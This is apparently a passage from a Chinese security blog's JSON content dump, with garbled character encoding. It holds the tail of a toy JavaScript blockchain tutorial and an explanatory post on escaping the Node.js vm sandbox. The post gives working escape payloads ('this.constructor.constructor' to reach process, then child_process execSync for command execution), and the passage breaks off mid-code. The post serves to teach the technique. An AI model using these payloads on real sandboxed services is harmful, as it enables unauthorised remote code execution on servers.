Block(this.transactionPool,this.getLatestBlock().myHash)        newBlock.mine()        //æ·»åŠ åˆ°åŒºå—é“¾ï¼Œå¹¶æ¸…ç©ºTransaction Pool        this.chain.push(newBlock)        this.transactionPool = []    }\n\næ•´ä¸ªå†™å¥½çš„æ•°å­—ä»£å¸ï¼š\nconst sha256 = require('crypto-js/sha256')class Transaction{    constructor(from, to , amount) {        this.from = from        this.to = to        this.amount = amount    }}class Block{    constructor(transaction,previousHash) {        this.transactions = transaction        this.time = Date.now()        this.nonce = 1        this.previousHash = previousHash        this.myHash = this.calcHash()    }    // è®¡ç®—hashæ—¶è¦å°†dataè½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œæ­¤æ—¶çš„dataæ˜¯ä¸€ä¸ªtransaction    calcHash() {        return sha256(JSON.stringify(this.transactions) + this.time + this.previousHash + this.nonce).toString()    }    /** è·å–ç›¸åº”éš¾åº¦hash **/    getAnswer(difficulty){        let answer = \"\"        for(let i=0; i&lt;difficulty; i++)        {            answer += \"0\"        }        return answer    }   /** å¼•å…¥æŒ–çŸ¿åŠŸèƒ½ **/    mine(difficulty){        let answer = this.getAnswer(difficulty)        let Hash = this.calcHash()       while(true){            if (Hash.substring(0,difficulty) != answer)            {                this.nonce++                Hash = this.calcHash()            }else{                break            }       }       console.log(\"mine successful!\\n\")       console.log(\"è®¡ç®—\"+this.nonce+\"æ¬¡åæŒ–çŸ¿æˆåŠŸï¼Œanswerä¸º\"+Hash)       return Hash    }}class blockChain{    constructor()    {        this.chain = [this.createBlockchain()]        this.difficulty = 4        this.transactionPool = []  //æŒ–çŸ¿æˆåŠŸçš„è½¬è´¦ä¿¡æ¯        this.mineReward = 50       //æ¯æ¬¡æŒ–çŸ¿æˆåŠŸçš„å¥–åŠ±è´§å¸æ•°    }    createBlockchain()    {        return new Block(\"Genesisblock\",null)    }    getLatestBlock()    {        return this.chain[this.chain.length - 1]    }    //å°†Transactionæ·»åŠ åˆ°Transaction Poolä¸­    addTransaction(Transaction)    {        this.transactionPool.push(Transaction)    }    mineTransaction(minerAddress)    {        const minerRewardTransaction =  new Transaction('', minerAddress, this.mineReward)        this.transactionPool.push(minerRewardTransaction)        //æŒ–çŸ¿        /********************************************************         * è¿™é‡Œæ–°åŒºå—è®°å½•äº†æ•´ä¸ªåŒºå—é“¾çš„è½¬è´¦ä¿¡æ¯ï¼Œä½†åœ¨å®é™…æƒ…å†µä¸­åŒºå—çš„å­˜å‚¨         * å®¹é‡æ˜¯æœ‰é™åˆ¶çš„ï¼Œæ‰€ä»¥åœ¨æŒ–çŸ¿æ—¶è®°å½•çš„è½¬è´¦è®°å½•ä¼šé€‰æ‹©æ‰‹ç»­è´¹æœ€é«˜çš„transaction         * æˆ‘ä»¬è¿™é‡Œå…ˆä¸è€ƒè™‘è¿™ç§æƒ…å†µ         *******************************************************/        const newBlock = new Block(this.transactionPool,this.getLatestBlock().myHash)        newBlock.mine(this.difficulty)        //æ·»åŠ åˆ°åŒºå—é“¾ï¼Œå¹¶æ¸…ç©ºTransaction Pool        this.chain.push(newBlock)        this.transactionPool = []    }}/***********************************************éªŒè¯åŒºå—é“¾é˜²ç¯¡æ”¹éœ€è¦æ£€æµ‹ä¸¤é¡¹ï¼š 1.é‡æ–°è®¡ç®—åŒºå—çš„hashå€¼ï¼Œåˆ¤æ–­ä¸åŒºå—ä¸­å‚¨å­˜çš„hashæ˜¯å¦ç›¸åŒ 2.åˆ¤æ–­å½“å‰åŒºå—çš„previousHashæ˜¯å¦å’Œä¸Šä¸€åŒºå—çš„hashç›¸åŒ ***********************************************/function validateBlock(validBlockchain){    if (validBlockchain.chain.length == 1)    {        if(validBlockchain.chain[0].myHash != validBlockchain.calcHash())        {            console.log(\"æ•°æ®ç¯¡æ”¹\")            return false        }    }else {        for (let i=1; i&lt;=validBlockchain.chain.length-1; i++)        {            if(validBlockchain.chain[i].myHash != validBlockchain.chain[i].calcHash())            {                console.log(\"æ•°æ®ç¯¡æ”¹\")                return false            }            if (validBlockchain.chain[i].previousHash != validBlockchain.chain[i-1].myHash)            {                console.log(\"å‰ååŒºå—é“¾æ–­è£‚\")                return false            }        }    }    console.log(\"æ•°æ®æ— ç¯¡æ”¹ä¸”åŒºå—é“¾ç»“æ„å®Œæ•´\")    return true}Y1Coin = new blockChain()const Transaction1 = new Transaction('add1', 'add2', 20)const Transaction2 = new Transaction('add1', 'add2', 5)Y1Coin.addTransaction(Transaction1)Y1Coin.addTransaction(Transaction2)Y1Coin.mineTransaction(\"add3\")console.log(Y1Coin)console.log(Y1Coin.chain[1].transactions)\n\n\n","categories":["åŒºå—é“¾"],"tags":["web3.0"]},{"title":"VMæ²™ç®±é€ƒé€¸","url":"/2023/04/20/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/","content":"å‚è€ƒæ–‡ç« ï¼šhttps://blog.csdn.net/m0_62063669/article/details/125441529\nâ€‹                    https://blog.csdn.net/u012961419/article/details/121281538\nâ€‹                    https://blog.csdn.net/sunyctf/article/details/124434565\nâ€‹                    https://www.mianshigee.com/note/detail/27897wlr/#script-runinnewcontext-sandbox-options\nâ€‹                    https://blog.csdn.net/shawdow_bug/article/details/120072209?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&amp;utm_relevant_index=2\nProxy å’Œ Reflect - æ˜é‡‘ (juejin.cn)\nvm2å®ç°åŸç†åˆ†æ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)\nâ€‹                    Pç¥çŸ¥è¯†æ˜Ÿçƒ\nâ€‹                    \n0x01 æ²™ç®±é€ƒé€¸åˆè¯†è¯´åˆ°æ²™ç®±é€ƒé€¸ï¼Œæˆ‘ä»¬å…ˆæ¥æ˜ç¡®ä¸€äº›åŸºæœ¬çš„æ¦‚å¿µã€‚\n\nJavaScriptå’ŒNodejsä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼šJavaScriptç”¨åœ¨æµè§ˆå™¨å‰ç«¯ï¼Œåæ¥å°†Chromeä¸­çš„v8å¼•æ“å•ç‹¬æ‹¿å‡ºæ¥ä¸ºJavaScriptå•ç‹¬å¼€å‘äº†ä¸€ä¸ªè¿è¡Œç¯å¢ƒï¼Œå› æ­¤JavaScriptä¹Ÿå¯ä»¥ä½œä¸ºä¸€é—¨åç«¯è¯­è¨€ï¼Œå†™åœ¨åç«¯ï¼ˆæœåŠ¡ç«¯ï¼‰çš„JavaScriptå°±å«å«åšNodejsã€‚\nä»€ä¹ˆæ˜¯æ²™ç®±ï¼ˆsandboxï¼‰å½“æˆ‘ä»¬è¿è¡Œä¸€äº›å¯èƒ½ä¼šäº§ç”Ÿå±å®³çš„ç¨‹åºï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨ä¸»æœºçš„çœŸå®ç¯å¢ƒä¸Šè¿›è¡Œæµ‹è¯•ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å•ç‹¬å¼€è¾Ÿä¸€ä¸ªè¿è¡Œä»£ç çš„ç¯å¢ƒï¼Œå®ƒä¸ä¸»æœºç›¸äº’éš”ç¦»ï¼Œä½†ä½¿ç”¨ä¸»æœºçš„ç¡¬ä»¶èµ„æºï¼Œæˆ‘ä»¬å°†æœ‰å±å®³çš„ä»£ç åœ¨æ²™ç®±ä¸­è¿è¡Œåªä¼šå¯¹æ²™ç®±å†…éƒ¨äº§ç”Ÿä¸€äº›å½±å“ï¼Œè€Œä¸ä¼šå½±å“åˆ°ä¸»æœºä¸Šçš„åŠŸèƒ½ï¼Œæ²™ç®±çš„å·¥ä½œæœºåˆ¶ä¸»è¦æ˜¯ä¾é é‡å®šå‘ï¼Œå°†æ¶æ„ä»£ç çš„æ‰§è¡Œç›®æ ‡é‡å®šå‘åˆ°æ²™ç®±å†…éƒ¨ã€‚\næ²™ç®±ï¼ˆsandboxï¼‰å’Œ è™šæ‹Ÿæœºï¼ˆVMï¼‰å’Œ å®¹å™¨ï¼ˆDockerï¼‰ä¹‹é—´çš„åŒºåˆ«ï¼šsandboxå’ŒVMä½¿ç”¨çš„éƒ½æ˜¯è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œä½†äºŒè€…é—´ä½¿ç”¨çš„ç›®çš„ä¸ä¸€æ ·ã€‚æ²™ç®±ç”¨æ¥éš”ç¦»æœ‰å®³ç¨‹åºï¼Œè€Œè™šæ‹Ÿæœºåˆ™å®ç°äº†æˆ‘ä»¬åœ¨ä¸€å°ç”µè„‘ä¸Šä½¿ç”¨å¤šä¸ªæ“ä½œç³»ç»Ÿçš„åŠŸèƒ½ã€‚Dockerå±äºsandboxçš„ä¸€ç§ï¼Œé€šè¿‡åˆ›é€ ä¸€ä¸ªæœ‰è¾¹ç•Œçš„è¿è¡Œç¯å¢ƒå°†ç¨‹åºæ”¾åœ¨é‡Œé¢ï¼Œä½¿ç¨‹åºè¢«è¾¹ç•Œå›°ä½ï¼Œä»è€Œä½¿ç¨‹åºä¸ç¨‹åºï¼Œç¨‹åºä¸ä¸»æœºä¹‹é—´ç›¸äº’éš”ç¦»å¼€ã€‚åœ¨å®é™…é˜²æŠ¤æ—¶ï¼Œä½¿ç”¨Dockerå’ŒsandboxåµŒå¥—çš„æ–¹å¼æ›´å¤šä¸€ç‚¹ï¼Œå®‰å…¨æ€§ä¹Ÿæ›´é«˜ã€‚\nåœ¨Nodejsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¼•å…¥vmæ¨¡å—æ¥åˆ›å»ºä¸€ä¸ªâ€œæ²™ç®±â€ï¼Œä½†å…¶å®è¿™ä¸ªvmæ¨¡å—çš„éš”ç¦»åŠŸèƒ½å¹¶ä¸å®Œå–„ï¼Œè¿˜æœ‰å¾ˆå¤šç¼ºé™·ï¼Œå› æ­¤Nodeåç»­å‡çº§äº†vmï¼Œä¹Ÿå°±æ˜¯ç°åœ¨çš„vm2æ²™ç®±ï¼Œvm2å¼•ç”¨äº†vmæ¨¡å—çš„åŠŸèƒ½ï¼Œå¹¶åœ¨å…¶åŸºç¡€ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ã€‚\n\n0x02 Nodeå°†å­—ç¬¦ä¸²æ‰§è¡Œä¸ºä»£ç æˆ‘ä»¬å…ˆæ¥çœ‹ä¸¤ä¸ªåœ¨nodeä¸­å°†æŠŠå­—ç¬¦ä¸²æ‰§è¡Œæˆä»£ç çš„æ–¹å¼ã€‚\næ–¹æ³•ä¸€ eval\né¦–å…ˆæˆ‘åœ¨ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªage.txt\nvar age = 18\n\nåˆ›å»ºä¸€ä¸ªy1.js\nconst fs = require('fs')let content = fs.readFileSync('age.txt', 'utf-8')console.log(content)eval(content)console.log(age)\n\n\nå¯ä»¥å‘ç°æˆ‘ä»¬é€šè¿‡evalæ‰§è¡Œäº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¿™ç§æ‰§è¡Œæ–¹å¼å¦‚æœåœ¨å½“å‰ä½œç”¨åŸŸä¸‹å·²ç»æœ‰äº†åŒåçš„ageå˜é‡ï¼Œè¿™ä¸ªç¨‹åºå°±ä¼šæŠ¥é”™ã€‚\n\nåœ¨jsä¸­æ¯ä¸€ä¸ªæ¨¡å—éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„ä½œç”¨åŸŸï¼Œæ‰€ä»¥ç”¨evalæ‰§è¡Œå­—ç¬¦ä¸²ä»£ç å¾ˆå®¹æ˜“å‡ºç°ä¸Šé¢çš„è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å†çœ‹å¦å¤–ä¸€ç§æ–¹æ³•ã€‚\næ–¹æ³•äºŒï¼šnew Function\nä¸Šé¢çš„æ–¹æ³•å› ä¸ºæ¨¡å—é—´çš„ä½œç”¨åŸŸè¢«é™åˆ¶äº†ä½¿ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬è€ƒè™‘ä¸€ä¸‹å¦‚æœèƒ½å¤Ÿè‡ªå·±åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸæ˜¯ä¸æ˜¯å°±å¯ä»¥æ›´åŠ æ–¹ä¾¿çš„æ‰§è¡Œä»£ç å‘¢ï¼Ÿnew Functionçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å½¢å‚åç§°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å‡½æ•°ä½“ã€‚\n\næˆ‘ä»¬éƒ½çŸ¥é“å‡½æ•°å†…å’Œå‡½æ•°å¤–æ˜¯ä¸¤ä¸ªä½œç”¨åŸŸï¼Œä¸è¿‡å½“åœ¨å‡½æ•°ä¸­çš„ä½œç”¨åŸŸæƒ³è¦ä½¿ç”¨å‡½æ•°å¤–çš„å˜é‡æ—¶ï¼Œè¦é€šè¿‡å½¢å‚æ¥ä¼ é€’ï¼Œå½“å‚æ•°è¿‡å¤šæ—¶è¿™ç§æ–¹æ³•å°±å˜çš„éº»çƒ¦èµ·æ¥äº†ã€‚\nä»ä¸Šé¢ä¸¤ä¸ªæ‰§è¡Œä»£ç çš„ä¾‹å­å¯ä»¥çœ‹å‡ºæ¥å…¶å®æˆ‘ä»¬çš„æ€æƒ³å°±æ˜¯å¦‚ä½•åˆ›å»ºä¸€ä¸ªèƒ½å¤Ÿé€šè¿‡ä¼ ä¸€ä¸ªå­—ç¬¦ä¸²å°±èƒ½æ‰§è¡Œä»£ç ï¼Œå¹¶ä¸”è¿˜ä¸å¤–éƒ¨éš”ç»çš„ä½œç”¨åŸŸï¼Œè¿™ä¹Ÿå°±æ˜¯vmæ¨¡å—çš„ä½œç”¨ã€‚\n0x03 Nodejsä½œç”¨åŸŸè¯´åˆ°ä½œç”¨åŸŸï¼Œæˆ‘ä»¬å°±è¦è¯´ä¸€ä¸‹Nodeä¸­çš„ä½œç”¨åŸŸæ˜¯æ€ä¹ˆåˆ†é…çš„ï¼ˆåœ¨Nodeä¸­ä¸€èˆ¬æŠŠä½œç”¨åŸŸå«ä¸Šä¸‹æ–‡ï¼‰ã€‚\nåœ¨Webç«¯ï¼ˆæµè§ˆå™¨ï¼‰ï¼Œå‘æŒ¥ä½œç”¨çš„ä¸€èˆ¬æ˜¯JavaScriptï¼Œå­¦è¿‡JavaScriptçš„å¸ˆå‚…åº”è¯¥éƒ½çŸ¥é“æˆ‘ä»¬æ‰“å¼€æµè§ˆå™¨çš„çª—å£æ˜¯JavaScriptä¸­æœ€å¤§çš„å¯¹è±¡windowï¼Œé‚£ä¹ˆåœ¨æœåŠ¡ç«¯å‘æŒ¥ä½œç”¨çš„Nodeå®ƒçš„æ„é€ å’ŒJavaScriptä¸å¤ªä¸€æ ·ã€‚\næˆ‘ä»¬åœ¨å†™ä¸€ä¸ªNodeé¡¹ç›®æ—¶å¾€å¾€è¦åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œruquireå…¶ä»–çš„jsæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶æˆ‘ä»¬éƒ½ç»™å®ƒä»¬å«åšâ€œåŒ…â€ã€‚æ¯ä¸€ä¸ªåŒ…éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„ä¸Šä¸‹æ–‡ï¼ŒåŒ…ä¹‹é—´çš„ä½œç”¨åŸŸæ˜¯äº’ç›¸éš”ç¦»ä¸äº’é€šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å°±ç®—æˆ‘åœ¨y1.jsä¸­requireäº†y2.jsï¼Œé‚£ä¹ˆæˆ‘åœ¨y1.jsä¸­ä¹Ÿæ— æ³•ç›´æ¥è°ƒç”¨y2.jsä¸­çš„å˜é‡å’Œå‡½æ•°ï¼Œä¸¾ä¸ªä¾‹å­ã€‚\nåœ¨åŒä¸€çº§ç›®å½•ä¸‹æœ‰y1.jså’Œy2.jsä¸¤ä¸ªæ–‡ä»¶\ny1.js\nvar age = 20\n\ny2.js\nconst a = require(\"./y1\")console.log(a.age)\n\nè¿è¡Œy2.jså‘ç°æŠ¥é”™ age å€¼ä¸ºundefined\n\né‚£ä¹ˆæˆ‘ä»¬æƒ³y2ä¸­å¼•å…¥å¹¶ä½¿ç”¨y1ä¸­çš„å…ƒç´ åº”è¯¥æ€ä¹ˆåŠå‘¢ï¼ŒNodeç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå°†jsæ–‡ä»¶ä¸­å…ƒç´ è¾“å‡ºçš„æ¥å£exports ï¼ŒæŠŠy1ä¿®æ”¹æˆä¸‹é¢è¿™æ ·ï¼š\ny1.js\nvar age = 20exports.age = age\n\næˆ‘ä»¬å†è¿è¡Œy2å°±å¯ä»¥æ‹¿åˆ°ageçš„å€¼äº†\n\næˆ‘ä»¬ç”¨å›¾æ¥è§£é‡Šè¿™ä¸¤ä¸ªåŒ…ä¹‹é—´çš„å…³ç³»å°±æ˜¯\n\nè¿™ä¸ªæ—¶å€™å°±æœ‰äººä¼šé—®å·¦ä¸Šè§’çš„globalæ˜¯ä»€ä¹ˆï¼Ÿè¿™é‡Œå°±è¦è¯´åˆ°Nodejsä¸­çš„å…¨å±€å¯¹è±¡äº†ã€‚\nåˆšæ‰æˆ‘ä»¬æåˆ°åœ¨JavaScriptä¸­windowæ˜¯å…¨å±€å¯¹è±¡ï¼Œæµè§ˆå™¨å…¶ä»–æ‰€æœ‰çš„å±æ€§éƒ½æŒ‚è½½åœ¨windowä¸‹ï¼Œé‚£ä¹ˆåœ¨æœåŠ¡ç«¯çš„Nodejsä¸­å’Œwindowç±»ä¼¼çš„å…¨å±€å¯¹è±¡å«åšglobalï¼ŒNodejsä¸‹å…¶ä»–çš„æ‰€æœ‰å±æ€§å’ŒåŒ…éƒ½æŒ‚è½½åœ¨è¿™ä¸ªglobalå¯¹è±¡ä¸‹ã€‚åœ¨globalä¸‹æŒ‚è½½äº†ä¸€äº›å…¨å±€å˜é‡ï¼Œæˆ‘ä»¬åœ¨è®¿é—®è¿™äº›å…¨å±€å˜é‡æ—¶ä¸éœ€è¦ç”¨global.xxxçš„æ–¹å¼æ¥è®¿é—®ï¼Œç›´æ¥ç”¨xxxå°±å¯ä»¥è°ƒç”¨è¿™ä¸ªå˜é‡ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œconsoleå°±æ˜¯æŒ‚è½½åœ¨globalä¸‹çš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæˆ‘ä»¬åœ¨ç”¨console.logè¾“å‡ºæ—¶å¹¶ä¸éœ€è¦å†™æˆglobal.console.logï¼Œå…¶ä»–å¸¸è§å…¨å±€å˜é‡è¿˜æœ‰processï¼ˆä¸€ä¼šé€ƒé€¸è¦ç”¨åˆ°ï¼‰ã€‚\næˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰‹åŠ¨å£°æ˜ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œä½†å…¨å±€å˜é‡åœ¨æ¯ä¸ªåŒ…ä¸­éƒ½æ˜¯å…±äº«çš„ï¼Œæ‰€ä»¥å°½é‡ä¸è¦å£°æ˜å…¨å±€å˜é‡ï¼Œä¸ç„¶å®¹æ˜“å¯¼è‡´å˜é‡æ±¡æŸ“ã€‚ç”¨ä¸Šé¢çš„ä»£ç ä¸¾ä¸ªä¾‹å­ï¼š\ny1.js\nglobal.age = 20\n\n y2.js\nconst a = require(\"./y1\")console.log(age)\n\nè¾“å‡ºï¼š\n\nå¯ä»¥å‘ç°æˆ‘è¿™æ¬¡åœ¨y1ä¸­å¹¶æ²¡æœ‰ä½¿ç”¨exportså°†ageå¯¼å…¥ï¼Œå¹¶ä¸”y2åœ¨è¾“å‡ºæ—¶ä¹Ÿæ²¡æœ‰ç”¨a.ageï¼Œå› ä¸ºæ­¤æ—¶ageå·²ç»æŒ‚è½½åœ¨globalä¸Šäº†ï¼Œå®ƒçš„ä½œç”¨åŸŸå·²ç»ä¸åœ¨y1ä¸­äº†ã€‚\næˆ‘ä»¬è¾“å‡ºä¸€ä¸‹globalå¯¹è±¡ï¼Œå¯ä»¥çœ‹åˆ°ageç¡®å®æŒ‚è½½åœ¨äº†globalä¸Šï¼š\n&lt;ref *1&gt; Object [global] {  global: [Circular *1],  clearInterval: [Function: clearInterval],  clearTimeout: [Function: clearTimeout],  setInterval: [Function: setInterval],  setTimeout: [Function: setTimeout] {    [Symbol(nodejs.util.promisify.custom)]: [Getter]  },  queueMicrotask: [Function: queueMicrotask],  performance: Performance {    nodeTiming: PerformanceNodeTiming {      name: 'node',      entryType: 'node',      startTime: 0,      duration: 25.98190000653267,      nodeStart: 0.4919999986886978,      v8Start: 2.0012000054121017,      bootstrapComplete: 18.864999994635582,      environment: 10.277099996805191,      loopStart: -1,      loopExit: -1,      idleTime: 0    },    timeOrigin: 1665558311872.296  },  clearImmediate: [Function: clearImmediate],  setImmediate: [Function: setImmediate] {    [Symbol(nodejs.util.promisify.custom)]: [Getter]  },  age: 20}\n\n\n\n0x04 vmæ²™ç®±é€ƒé€¸æˆ‘ä»¬åœ¨å‰é¢æåˆ°äº†ä½œç”¨åŸŸè¿™ä¸ªæ¦‚å¿µï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨æ€è€ƒä¸€ä¸‹ï¼Œå¦‚æœæƒ³è¦å®ç°æ²™ç®±çš„éš”ç¦»ä½œç”¨ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸï¼Œè®©ä»£ç åœ¨è¿™ä¸ªæ–°çš„ä½œç”¨åŸŸé‡Œé¢å»è¿è¡Œï¼Œè¿™æ ·å°±å’Œå…¶ä»–çš„ä½œç”¨åŸŸè¿›è¡Œäº†éš”ç¦»ï¼Œè¿™ä¹Ÿå°±æ˜¯vmæ¨¡å—è¿è¡Œçš„åŸç†ï¼Œå…ˆæ¥äº†è§£å‡ ä¸ªå¸¸ç”¨çš„vmæ¨¡å—çš„APIã€‚\n\nvm.runinThisContext(code)ï¼šåœ¨å½“å‰globalä¸‹åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼ˆsandboxï¼‰ï¼Œå¹¶å°†æ¥æ”¶åˆ°çš„å‚æ•°å½“ä½œä»£ç è¿è¡Œã€‚sandboxä¸­å¯ä»¥è®¿é—®åˆ°globalä¸­çš„å±æ€§ï¼Œä½†æ— æ³•è®¿é—®å…¶ä»–åŒ…ä¸­çš„å±æ€§ã€‚\n\n\n\nconst vm = require('vm');let localVar = 'initial value';const vmResult = vm.runInThisContext('localVar = \"vm\";');console.log('vmResult:', vmResult);console.log('localVar:', localVar);// vmResult: 'vm', localVar: 'initial value'\n\n\nvm.createContext([sandbox])ï¼š åœ¨ä½¿ç”¨å‰éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªæ²™ç®±å¯¹è±¡ï¼Œå†å°†æ²™ç®±å¯¹è±¡ä¼ ç»™è¯¥æ–¹æ³•ï¼ˆå¦‚æœæ²¡æœ‰åˆ™ä¼šç”Ÿæˆä¸€ä¸ªç©ºçš„æ²™ç®±å¯¹è±¡ï¼‰ï¼Œv8ä¸ºè¿™ä¸ªæ²™ç®±å¯¹è±¡åœ¨å½“å‰globalå¤–å†åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼Œæ­¤æ—¶è¿™ä¸ªæ²™ç®±å¯¹è±¡å°±æ˜¯è¿™ä¸ªä½œç”¨åŸŸçš„å…¨å±€å¯¹è±¡ï¼Œæ²™ç®±å†…éƒ¨æ— æ³•è®¿é—®globalä¸­çš„å±æ€§ã€‚\nvm.runInContext(code, contextifiedSandbox[, options])ï¼šå‚æ•°ä¸ºè¦æ‰§è¡Œçš„ä»£ç å’Œåˆ›å»ºå®Œä½œç”¨åŸŸçš„æ²™ç®±å¯¹è±¡ï¼Œä»£ç ä¼šåœ¨ä¼ å…¥çš„æ²™ç®±å¯¹è±¡çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¹¶ä¸”å‚æ•°çš„å€¼ä¸æ²™ç®±å†…çš„å‚æ•°å€¼ç›¸åŒã€‚\n\nconst util = require('util');const vm = require('vm');global.globalVar = 3;const sandbox = { globalVar: 1 };vm.createContext(sandbox);vm.runInContext('globalVar *= 2;', sandbox);console.log(util.inspect(sandbox)); // { globalVar: 2 }console.log(util.inspect(globalVar)); // 3\n\n\nvm.runInNewContext(code[, sandbox][, options]): creatContextå’ŒrunInContextçš„ç»“åˆç‰ˆï¼Œä¼ å…¥è¦æ‰§è¡Œçš„ä»£ç å’Œæ²™ç®±å¯¹è±¡ã€‚\nvm.Scriptç±» vm.Scriptç±»å‹çš„å®ä¾‹åŒ…å«è‹¥å¹²é¢„ç¼–è¯‘çš„è„šæœ¬ï¼Œè¿™äº›è„šæœ¬èƒ½å¤Ÿåœ¨ç‰¹å®šçš„æ²™ç®±ï¼ˆæˆ–è€…ä¸Šä¸‹æ–‡ï¼‰ä¸­è¢«è¿è¡Œã€‚\nnew vm.Script(code, options)ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„vm.Scriptå¯¹è±¡åªç¼–è¯‘ä»£ç ä½†ä¸ä¼šæ‰§è¡Œå®ƒã€‚ç¼–è¯‘è¿‡çš„vm.Scriptæ­¤åå¯ä»¥è¢«å¤šæ¬¡æ‰§è¡Œã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œcodeæ˜¯ä¸ç»‘å®šäºä»»ä½•å…¨å±€å¯¹è±¡çš„ï¼Œç›¸åï¼Œå®ƒä»…ä»…ç»‘å®šäºæ¯æ¬¡æ‰§è¡Œå®ƒçš„å¯¹è±¡ã€‚codeï¼šè¦è¢«è§£æçš„JavaScriptä»£ç \n\nconst util = require('util');const vm = require('vm');const sandbox = { animal: 'cat', count: 2};const script = new vm.Script('count += 1; name = \"kitty\";');const context = vm.createContext(sandbox);script.runInContext(context);console.log(util.inspect(sandbox));// { animal: 'cat', count: 3, name: 'kitty' }\n\nscriptå¯¹è±¡å¯ä»¥é€šè¿‡runInXXXContextè¿è¡Œã€‚\n\n\næˆ‘ä»¬ä¸€èˆ¬è¿›è¡Œæ²™ç®±é€ƒé€¸æœ€åéƒ½æ˜¯è¿›è¡Œrceï¼Œé‚£ä¹ˆåœ¨Nodeé‡Œè¦è¿›è¡Œrceå°±éœ€è¦proccesäº†ï¼Œåœ¨è·å–åˆ°processå¯¹è±¡åæˆ‘ä»¬å°±å¯ä»¥ç”¨requireæ¥å¯¼å…¥child_processï¼Œå†åˆ©ç”¨child_processæ‰§è¡Œå‘½ä»¤ã€‚ä½†processæŒ‚è½½åœ¨globalä¸Šï¼Œä½†æ˜¯æˆ‘ä»¬ä¸Šé¢è¯´äº†åœ¨creatContextåæ˜¯ä¸èƒ½è®¿é—®åˆ°globalçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡æ˜¯é€šè¿‡å„ç§åŠæ³•å°†globalä¸Šçš„processå¼•å…¥åˆ°æ²™ç®±ä¸­ã€‚\nå¦‚æœæˆ‘ä»¬æŠŠä»£ç æ”¹æˆè¿™æ ·ï¼ˆcodeå‚æ•°æœ€å¥½ç”¨åå¼•å·åŒ…è£¹ï¼Œè¿™æ ·å¯ä»¥ä½¿codeæ›´ä¸¥æ ¼ä¾¿äºæ‰§è¡Œï¼‰ï¼š\n\"use strict\";const vm = require(\"vm\");const y1 = vm.runInNewContext(`this.constructor.constructor('return process.env')()`);console.log(y1);\n\n\nvm.runInNewContext(`this.constructor.constructor('return process.env')()`);\n\né‚£ä¹ˆæˆ‘ä»¬æ˜¯æ€ä¹ˆå®ç°é€ƒé€¸çš„å‘¢ï¼Œé¦–å…ˆè¿™é‡Œé¢çš„thisæŒ‡å‘çš„æ˜¯å½“å‰ä¼ é€’ç»™runInNewContextçš„å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ä¸å±äºæ²™ç®±ç¯å¢ƒçš„ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªå¯¹è±¡è·å–åˆ°å®ƒçš„æ„é€ å™¨ï¼Œå†è·å¾—ä¸€ä¸ªæ„é€ å™¨å¯¹è±¡çš„æ„é€ å™¨ï¼ˆæ­¤æ—¶ä¸ºFunctionçš„constructorï¼‰ï¼Œæœ€åçš„()æ˜¯è°ƒç”¨è¿™ä¸ªç”¨Functionçš„constructorç”Ÿæˆçš„å‡½æ•°ï¼Œæœ€ç»ˆè¿”å›äº†ä¸€ä¸ªprocesså¯¹è±¡ã€‚\nä¸‹é¢è¿™è¡Œä»£ç ä¹Ÿå¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœï¼š\nconst y1 = vm.runInNewContext(`this.toString.constructor('return process')()`);\n\nç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿”å›çš„processå¯¹è±¡æ¥rceäº†\ny1.mainModule.require('child_process').execSync('whoami').toString()\n\n\n\nè¿™é‡ŒçŸ¥è¯†æ˜Ÿçƒä¸Šæåˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œä¸‹é¢è¿™æ®µä»£ç ï¼š\nconst vm = require('vm');const script = `m + n`;const sandbox = { m: 1, n: 2 };const context = new vm.createContext(sandbox);const res = vm.runInContext(script, 